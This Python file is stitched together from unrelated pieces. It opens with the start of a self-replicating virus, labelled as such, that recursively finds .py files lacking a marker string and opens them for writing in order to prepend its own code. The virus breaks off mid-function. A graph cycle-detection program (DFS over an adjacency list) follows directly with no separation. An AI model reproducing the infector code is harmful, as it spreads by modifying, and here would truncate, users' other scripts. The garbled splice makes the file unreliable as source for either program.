#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python Program to detect cycle in an undirected graph
from collections import defaultdict
 
# This class represents a undirected
# graph using adjacency list representation
 
 
class Graph:
 
    def __init__(self, vertices):
 
        # No. of vertices
        self.V = vertices  # No. of vertices
 
        # Default dictionary to store graph
        self.graph = defaultdict(list)
 
    # Function to add an edge to graph
    def addEdge(self, v, w):
 
        # Add w to v_s list
        self.graph[v].append(w)
 
        # Add v to w_s list
        self.graph[w].append(v)
 
    # A recursive function that uses
    # visited[] and parent to detect
    # cycle in subgraph reachable from vertex v.
    def isCyclicUtil(self, v, visited, parent):
 
        # Mark the current node as visited
        visited[v] = True
 
        # Recur for all the vertices
        # adjacent to this vertex
        for i in self.graph[v]:
 
            # If the node is not
            # visited then recurse on it
            if visited[i] == False:
                if(self.isCyclicUtil(i, visited, v)):
                    return True
            # If an adjacent vertex is
            # visited and not parent
            # of current vertex,
            # then there is a cycle
            elif parent != i:
                return True
 
        return False
 
    # Returns true if the graph
    # contains a cycle, else false.
 
    def isCyclic(self):
 
        # Mark all the vertices
        # as not visited
        visited = [False]*(self.V)
 
        # Call the recursive helper
        # function to detect cycle in different
        # DFS trees
        for i in range(self.V):
 
            # Don't recur for u if it
            # is already visited
            if visited[i] == False:
                if(self.isCyclicUtil
                   (i, visited, -1)) == True:
                    return True
 
        return False
 
 
# Create a graph given in the above diagram
g = Graph(5)
g.addEdge(1, 0)
g.addEdge(1, 2)
g.addEdge(2, 0)
g.addEdge(0, 3)
g.addEdge(3, 4)
 
if g.isCyclic():
    print("Graph contains cycle")
else:
    print("Graph does not contain cycle ")
g1 = Graph(3)
g1.addEdge(0, 1)
g1.addEdge(1, 2)
 
 
if g1.isCyclic():
    print("Graph contains cycle")
else:
    print("Graph does not contain cycle ")
 
# This code is contributed by Neelam Yadav
# Time Complexity: O(V + E) - The program does a simple DFS Traversal of the graph which is represented using adjacency list. So the time complexity is O(V + E)
# Space Complexity: O(V) - To store the visited array O(V) space is required